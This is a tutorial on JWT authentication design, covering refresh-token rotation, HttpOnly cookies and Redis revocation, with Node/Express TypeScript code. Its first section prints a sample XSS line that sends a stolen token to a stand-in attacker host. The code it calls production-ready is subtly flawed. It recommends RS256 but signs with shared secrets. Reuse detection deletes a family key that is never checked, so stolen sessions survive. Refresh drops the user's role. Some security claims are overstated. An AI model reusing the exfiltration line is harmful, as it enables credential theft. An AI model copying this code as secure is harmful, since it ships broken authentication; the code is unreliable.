# Modern JWT Authentication Architecture: Access, Refresh Tokens & Blacklisting

JSON Web Tokens (JWTs) are the standard for stateless authentication in modern distributed applications. However, most online tutorials instruct developers to store access tokens in browser `localStorage` or `sessionStorage`. This pattern introduces severe vulnerabilities, making user accounts susceptible to Cross-Site Scripting (XSS) token theft and session hijacking with zero ability to revoke compromised credentials.

In this deep architectural guide, we construct a **battle-tested, production-ready JWT authentication system** using rotating refresh tokens, HttpOnly cookies, and distributed Redis token revocation.

---

## 1. The Vulnerability of `localStorage` Token Storage

When a JavaScript web application stores a JWT in `localStorage`, any script executing in the document context has unrestricted read access to that secret:

```javascript
// Any XSS vulnerability (e.g., via a compromised npm package or unsanitized markdown)
// can instantly steal the user's authentication token:
const stolenToken = localStorage.getItem("access_token");
fetch("https://attacker-c2.com/steal?token=" + encodeURIComponent(stolenToken));
```

Because `localStorage` provides zero defense against malicious client scripts, the security community considers client-side token storage an architectural failure.

---

## 2. The Dual-Token Security Pattern

To combine the scalability of stateless authentication with robust security and instant revocation capability, we employ a dual-token architecture:

```
[Browser Client]                         [Auth API Gateway]                     [Redis Cache]
       │                                         │                                    │
       ├─── POST /api/auth/login ───────────────>│                                    │
       │                                         │── Verify Credentials ─────────────>│
       │                                         │<── Valid User Record ──────────────│
       │<── Set-Cookie: refresh_token (HttpOnly) ├── Generate RS256 Access Token      │
       │    Body: { access_token, expires_in }   ├── Store Refresh Token Hash ───────>│
       │                                         │                                    │
       ├─── GET /api/data (Bearer access_token) ─>│                                    │
       │    (Valid for 15 minutes)               ├── Verify Signature Locally (0 DB)  │
       │<── Response: 200 OK                     │                                    │
```

### Components
1. **Access Token (Short-Lived: 10–15 Minutes)**:
   * Stored in browser memory (JavaScript closure or state variable).
   * Sent in the `Authorization: Bearer <token>` HTTP header.
   * Validated locally by microservices using asymmetric public key cryptography (RS256) with zero database round-trips.

2. **Refresh Token (Long-Lived: 7–30 Days)**:
   * Stored in an **HttpOnly, Secure, SameSite=Strict** cookie.
   * Inaccessible to browser JavaScript, completely eliminating XSS token theft.
   * Rotated on every use (Refresh Token Rotation).

---

## 3. Implementing Refresh Token Rotation

Refresh Token Rotation ensures that if an attacker somehow captures a refresh token, it can only be used once. As soon as a used token is presented again, the auth service detects reuse and invalidates the entire session family.

### Production Node.js & Express Implementation

```typescript
// src/services/auth.service.ts
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import { redisClient } from '../config/redis';

const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET!;
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET!;

export interface UserSession {
  userId: string;
  role: string;
  familyId: string;
}

export function generateTokens(user: { id: string; role: string }, familyId?: string) {
  const currentFamilyId = familyId || crypto.randomUUID();
  
  // 15-Minute Short-Lived Access Token
  const accessToken = jwt.sign(
    { sub: user.id, role: user.role, family: currentFamilyId },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  // 7-Day Long-Lived Refresh Token
  const refreshTokenId = crypto.randomUUID();
  const refreshToken = jwt.sign(
    { sub: user.id, tokenId: refreshTokenId, family: currentFamilyId },
    REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken, refreshTokenId, familyId: currentFamilyId };
}

export async function rotateRefreshToken(oldRefreshToken: string) {
  let decoded: any;
  try {
    decoded = jwt.verify(oldRefreshToken, REFRESH_SECRET);
  } catch (err) {
    throw new Error('Invalid or expired refresh token');
  }

  const { sub: userId, tokenId, family: familyId } = decoded;

  // Check if token has already been consumed (Token Reuse Detection)
  const isUsed = await redisClient.get(`used_token:${tokenId}`);
  if (isUsed) {
    // CRITICAL: Possible token theft! Invalidate all sessions for this family immediately
    await redisClient.del(`family:${familyId}`);
    throw new Error('Token reuse detected. All active sessions invalidated for security.');
  }

  // Mark token as consumed with a 60-second grace period for concurrent requests
  await redisClient.set(`used_token:${tokenId}`, 'consumed', { EX: 60 });

  // Issue new dual tokens
  const newTokens = generateTokens({ id: userId, role: decoded.role || 'user' }, familyId);
  
  // Store active family reference
  await redisClient.set(`family:${familyId}`, newTokens.refreshTokenId, { EX: 7 * 86400 });

  return newTokens;
}
```

### Express Controller with Cookie Guards

```typescript
// src/controllers/auth.controller.ts
import { Request, Response } from 'express';
import { rotateRefreshToken } from '../services/auth.service';

export async function handleRefresh(req: Request, res: Response) {
  const oldRefreshToken = req.cookies.refresh_token;
  if (!oldRefreshToken) {
    return res.status(401).json({ error: 'Refresh token cookie missing' });
  }

  try {
    const { accessToken, refreshToken } = await rotateRefreshToken(oldRefreshToken);

    // Set hardened HttpOnly cookie
    res.cookie('refresh_token', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
      path: '/api/auth'
    });

    return res.json({ accessToken });
  } catch (error: any) {
    res.clearCookie('refresh_token', { path: '/api/auth' });
    return res.status(403).json({ error: error.message });
  }
}
```

---

## 4. Instant Token Revocation via Redis Blacklist

Because standard access tokens are stateless, an application cannot normally revoke a token before its expiration. When an admin bans a user or a user clicks "Log out of all devices", we insert the token signature or ID into a distributed Redis Bloom Filter or TTL key:

```typescript
// src/middleware/verify-jwt.ts
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import { redisClient } from '../config/redis';

export async function authenticateToken(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.status(401).json({ error: 'Access token required' });

  try {
    const payload: any = jwt.verify(token, process.env.JWT_ACCESS_SECRET!);
    
    // Check revocation blacklist in Redis (sub-millisecond lookup)
    const isRevoked = await redisClient.get(`blacklist:${payload.sub}`);
    if (isRevoked) {
      return res.status(403).json({ error: 'Session has been revoked' });
    }

    req.user = payload;
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid or expired token' });
  }
}
```

---

## 5. Security Checklist: Production Comparison

| Vulnerability Vector | `localStorage` Token Storage | Hardened Dual-Token HttpOnly Architecture |
|---|---|---|
| **XSS Token Extraction** | Vulnerable (100% token leak) | **Immune** (`HttpOnly` blocks JS reading) |
| **CSRF Protection** | Naturally immune | **Protected** via `SameSite=Strict` cookie flag |
| **Instant User Revocation** | Impossible until token expires | **Supported** via Redis Blacklist |
| **Stolen Token Replay** | Unlimited use until TTL | **Detected & Blocked** via Token Rotation |
| **Database Load** | 1 DB read per request (if session-backed) | **0 DB reads** (Stateless verification) |

---

## Frequently Asked Questions (FAQ)

### What happens if an access token is compromised during its 15-minute lifetime?
Because the access token lifetime is capped at 10–15 minutes, the attacker's window of opportunity is narrow. For immediate high-security invalidation (such as after a password change or suspicious login), the user's ID is pushed to the Redis blacklist, causing all downstream services to reject the token on the next request.

### Is `SameSite=Strict` enough to prevent CSRF attacks?
Yes. When a cookie is marked `SameSite=Strict`, the browser will refuse to send it on any cross-origin request, including links clicked from external emails or malicious third-party websites. For older browsers, combining `SameSite` with custom headers (such as `X-Requested-With`) provides total defense.

### Should we use RS256 or HS256 for signing tokens?
In microservice architectures, **RS256 (asymmetric RSA)** is superior. Only the authentication service possesses the private key to sign tokens, while dozens of independent microservices can verify tokens locally using the public key without needing access to the private signing secret.
